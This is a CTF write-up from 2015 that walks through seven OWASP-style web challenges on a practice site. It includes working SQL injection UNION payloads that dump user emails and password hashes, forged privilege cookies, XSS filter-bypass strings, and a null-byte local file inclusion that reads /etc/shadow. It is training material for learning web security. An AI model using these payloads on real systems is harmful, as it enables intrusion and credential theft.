/*
Title: Solutions to some random CTF wot we found
Description: Write-up of the solutions to a web-based CTF we found on the Intertubes.
Author: tracer
Date: 2015/08/27
*/

I have no idea where this CTF came from. It sells itself as an OWASP CTF, and possible for Latam Tour 2015. But it's not the [Latam Tour CTF](https://www.owasp.org/index.php/LatamTour2015#tab=CTF) mentioned on the OWASP site, which was South America anyway, while this one appears to be [Dutch](http://www.securityskills.nl/).

[Whatever, here it is!](https://ctf-ddn.rhcloud.com/)

Regardless, here are the solutions to all seven levels. Obviously: spoilers below.


------
## Web Level 01

> "Injection flaws are often found in SQL, LDAP, Xpath, or NoSQL queries; OS commands; XML parsers, SMTP Headers, program arguments, etc.
Once you have the email and password hash, google can help to find the real password."

SQL injection is pretty vanilla, so let's assume that's what we're starting with. Clicking on one of the categories takes you to a listing page

[https://ctf-ddn.rhcloud.com/challenges/web/01/lines.php?catId=Classic%20Cars&showquery=0](https://ctf-ddn.rhcloud.com/challenges/web/01/lines.php?catId=Classic%20Cars&showquery=0)

Notice we've got a *showquery* key on the querystring. Setting that to 1 will dump the query we've made back into the page. With that in mind, let's start throwing quotes around.

[https://ctf-ddn.rhcloud.com/challenges/web/01/lines.php?catId=Classic%20Cars%27%20UNION%20select%201;--&showquery=1](https://ctf-ddn.rhcloud.com/challenges/web/01/lines.php?catId=Classic%20Cars%27%20UNION%20select%201;--&showquery=1)

Yep, sure enough we can inject stuff. But it's not returning anything. This is probably due to our UNION having a different number of columns, or columns of the wrong type. So how many columns are we dealing with? Let's check using ORDER BY {columnNumber}.

[https://ctf-ddn.rhcloud.com/challenges/web/01/lines.php?catId=Classic%20Cars%27%20ORDER%20BY%209;%23&showquery=1](https://ctf-ddn.rhcloud.com/challenges/web/01/lines.php?catId=Classic%20Cars%27%20ORDER%20BY%209;%23&showquery=1)

ORDER BY 10 is the first one to error, so it looks like we have 9 columns. Also, using -- to comment out the rest of the query doesn't work with ORDER BY. We need to use # instead. I have no idea why. Anyway, now we have our number of columns in the result, we can start playing. I'll switch to just showing the contents of the 'catId' key now, since the rest of the URL is not relevant.

~~~~~~
Classic Cars' union select '1', '2', '3', '4', '5', '6', '7', '8', '9';%23
~~~~~~

Cool, that adds another row to the end of our table and shows us that the columns we need to fill are the second and sixth. Now let's query the *information_schema* tables and see what else is in this database.

~~~~~~
Classic Cars' union SELECT table_schema, table_name, null, null, null, null, null, null, null 
FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema';%23
~~~~~~

This dumps a list of tables names, and from the look of it the table we want is probably employees. Lets make some guesses about column names.

~~~~~~
Classic Cars' union select null,email,null,null,null,password,null,null,null from employees;%23
~~~~~~

Bingo! So our full URL now looks like this:

[https://ctf-ddn.rhcloud.com/challenges/web/01/lines.php?catId=Classic%20Cars%27%20union%20select%20null,email,null,null,null,password,null,null,null%20from%20employees;%23&showquery=1](https://ctf-ddn.rhcloud.com/challenges/web/01/lines.php?catId=Classic%20Cars%27%20union%20select%20null,email,null,null,null,password,null,null,null%20from%20employees;%23&showquery=1)

This appends the username and password hashes onto the end of the table.

~~~~~~
dmurphy@classicmodelcars.com	1c4708df8cb006d2a007b3920a7b92a5
mpatterso@classicmodelcars.com	ef73781effc5774100f87fe2f437a435
jfirrelli@classicmodelcars.com	ef73781effc5774100f87fe2f437a435
wpatterson@classicmodelcars.com	ef73781effc5774100f87fe2f437a435
gbondur@classicmodelcars.com	ef73781effc5774100f87fe2f437a435
...snip...
~~~~~~

Those password hashes are the right length for MD5, so let's do an MD5 reverse lookup and see if we get anything reasonable.

~~~~~~
1c4708df8cb006d2a007b3920a7b92a5  ->  presidente
ef73781effc5774100f87fe2f437a435  ->  1234abcd
~~~~~~

Looks good. Log in as *dmurphy@classicmodelcars.com* and job done!


------
## Web Level 02

> "Attacker uses leaks or flaws in the authentication or session management functions (e.g., exposed accounts, passwords, session IDs) to impersonate users. Usually the cookies keep this information Tip: Base64 is not an encription method"

The key word here is session management. That means cookies, so let's take a look.

~~~~~~
PRIVILEGES    Y21WaFpEb3d8ZDNKcGRHVTZNQT09fFlXUnRhVzQ2TUE9PQ==
UN            084e0343a0486ff05530df6c705c8bb4
~~~~~~

PRIVILEGES looks interesting, and the two equals signs on the end scream base64, so let's decode it and see what treats live inside.

~~~~~~
cmVhZDow|d3JpdGU6MA==|YWRtaW46MA==
~~~~~~

Looks like three more base64 encoded bits of data, separated by pipes.

~~~~~~
cmVhZDow        ->      read:0
d3JpdGU6MA==    ->      write:0
YWRtaW46MA==    ->      admin:0
~~~~~~

Well that's not what I want. Let's change those depressing 0s to happy 1s and then re-encode the bugger.

~~~~~~
read:1          ->      cmVhZDox
write:1         ->      d3JpdGU6MQ==
admin:1         ->      YWRtaW46MQ==
~~~~~~

And then glue those together with pipes and re-encode that too.

~~~~~~
Y21WaFpEb3h8ZDNKcGRHVTZNUT09fFlXUnRhVzQ2TVE9PQ==
~~~~~~

There's our new PRIVILEGES cookie. Now with added priviledges. But what about that UN cookie? Looks like MD5, and if we [look it up](http://md5.gromweb.com/?md5=084e0343a0486ff05530df6c705c8bb4) we'll see that it the hash for 'guest'. Let's flip that over to 'admin' instead.

~~~~~~
admin       ->      21232f297a57a5a743894a0e4a801fc3
~~~~~~

Write those cookies back in, reload the page, and you're good to go.



------
## Web Level 03

> "Almost any source of data can be an attack vector, including internal sources such as data from the database, or browser data like the user agent. "

And the next part says: 

> "And you checked the source code?" in Spanish.

Sure enough if you look in the source you'll see a commented out section which repeats the user agent of the request (the string which identifies different kinds of browser) back into the page. So if we tweak our user agent we should be able to inject Javascript. The easiest way to do that if you use Firefox is a user agent switcher addon, such as [this one](http://chrispederick.com/work/user-agent-switcher/).

Our first task is going to be to break out of the comment. If we set our user agent to:

~~~~~~
-->test<!--
~~~~~~

then our new content appears on the page. Next stage of the master plan is to get some Javascript running. It becomes apparent pretty quickly that there's some kind of blacklist on the backend which replaces certain input strings with five dashes. Here is a list I turned up while grinding through possible approaches.

- &lt;a
- script
- li
- div
- onmouseover

Here are some of the things I tried that didn't work:

~~~~~~
--><script>alert('foo');</script><!--
-->< SCRIPT>alert('foo');</ SCRIPT><!--
--><a onclick="alert('foo');">test</a><!--
--><em onmouseover="alert('foo');">test</em><!--
~~~~~~

In the end I settled on the one below. It uses an em tag since they get past the blacklist, and the onmouseout event attribute also sneaks by. Simply mouse over the "test" text and then move off it to fire the code.

~~~~~~
--><em onmouseout="alert('foo');">test</em><!--
~~~~~~

Movin' on.

------
## Web Level 04

> "Sometimes developers can use version controls system like git o SVN. You can try to check the svn documentation (wc.db and pristine)." 

This one practially tells you what to do. Let's go take a look at that sweet, juicy Subversion metadata.

[https://ctf-ddn.rhcloud.com/challenges/web/04/.svn/wc.db](https://ctf-ddn.rhcloud.com/challenges/web/04/.svn/wc.db)

Turns out it's an SQLite database. Crack it open and run a quick query:

~~~~~~
select * from NODES
~~~~~~

And it's pretty obvious where our login URL is:

[https://ctf-ddn.rhcloud.com/challenges/web/04/the_login_folder_is_here/index.php](https://ctf-ddn.rhcloud.com/challenges/web/04/the_login_folder_is_here/index.php)

Next!

------
## Web Level 05

> "Security misconfiguration can happen at any level of an application stack, including the platform, web server, application server, database, framework, and custom code. The secret is in cors."

CORS, huh? Well let's try sending a [CORS preflight](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing#Preflight_example), but tell it we're *http://www.owasp.org*, as implied by the page text. We can do this by using the OPTIONS method, and including an *Origin* header.

~~~~~~
OPTIONS https://ctf-ddn.rhcloud.com/challenges/web/05/ HTTP/1.1
User-Agent: Fiddler
Host: ctf-ddn.rhcloud.com
Origin: http://www.owasp.org
~~~~~~

And it straight out tells you the secret word.

~~~~~~
OriginControl
~~~~~~

K.


------
## Web Level 06

> "Injection flaws are often found in SQL, LDAP, Xpath, or NoSQL queries; OS commands; XML parsers, SMTP Headers, program arguments, etc"

I took a scenic route to get this one. I was running various posts through Fiddler when I realised that the GETs were returning more bytes than the POSTs, even though the POSTs displayed more text. A quick look shows that the GETs have a chunk of Javacript included which dumps something to console.log. I reloaded the page in a browser, checked the console in Firebug and see the message:

~~~~~~
The file passwords/accounts.txt is full
~~~~~~

Charming. Browsing to [passwords/accounts.txt](https://ctf-ddn.rhcloud.com/challenges/web/06/passwords/accounts.txt) gives you the password file, which contains MD5 hashes. Another reverse lookup on the admin hash and there's your password. Makes sense why the hint was commented out now, since it's not relevant.

~~~~~~
latinoamerica
~~~~~~

Almost home . . .


------
## Web Level 07

Toy content management systems are ripe with local file inclusion, so let's go with that assumption for now. The most obvious thing to play with on the first page is the 'lang' setting, so let's mess with that and see what happens. If you ask for the language 'foo' then the page spits back this:

~~~~~~
Unable to open file! foo.txt
~~~~~~

Oh really. Gee, I wonder . . .

~~~~~~
Unable to open file! /etc/passwd.txt 
~~~~~~

Bugger. It's adding the '.txt' onto the end of whatever we send it, which simply won't do. But wait - we're on a PHP site, and PHP still uses null-terminated strings. So if we send a null on the end of our input we might be able to fool PHP into cutting the end off the string.

~~~~~~
lang=/etc/shadow%00
~~~~~~

I had to resort to [Fiddler](http://www.telerik.com/fiddler) for this one to stop it double-escaping my input, but that's fine. AndyTech, IRC denizen and CTF study-buddy, just used curl, which is simpler.

~~~~~~
<AndyTech> literally...  curl --data "lang=/etc/shadow%00" 
~~~~~~

Either way, we now have ourselves a shadow file.

~~~~~~
...snip...
smmta:*:15792:0:99999:7:::
smmsp:*:15792:0:99999:7:::
owasp:$1$BHZLob3h$mru35IhZzRdnfTHOADrkJ0:15897:0:99999:7:::
postfix:*:15901:0:99999:7:::
proftpd:!:16051:0:99999:7:::
...snip...
~~~~~~

Thankfully it's a $1$ hash, meaning salted MD5, so we're in with a shot at cracking this one. I spent a fruitless time running it through ye olde CPU version of [hashcat](http://hashcat.net/hashcat/) with the rockyou list because I have a janky Intel GPU in my laptop, whereas AndyTech just [Googled the hash](https://www.google.co.uk/search?q=%22%241%24BHZLob3h%24mru35IhZzRdnfTHOADrkJ0%22) in it's entirety and got the result that way.

~~~~~~
<AndyTech> hey tracer
<AndyTech> found it lol
<tracer> Yeah? Nice. Hashcat is still churning away ...
<AndyTech> google mate ;-)
<AndyTech> with "" quotations obvously
<AndyTech> 7/7 - I can return to my life now
<AndyTech> don't share these anymore ;-)
<tracer> LOL - why the fuck didn't I just Google the whole hash?!
<tracer> Oh well, at least my laptop is now heating the office. Nice find.
<AndyTech> hahaha
~~~~~~

The password wasn't even in the rockyou list. Hash cracking sucks.

## Yay

So there you have it. It was quite a fun CTF, although the levels felt like they were backwards. The SQLI and XSS levels (1 and 3) were probably the most involved, and some of the later ones felt a little like filler. One thing I liked is that all of the levels could be completed independently, because it's always a pain on the arse if you can't crack an early level and have to give up since later ones depend on it.

If you come across any more, drop the link in IRC or post them on the mailing list. We're always willing to be distracted.
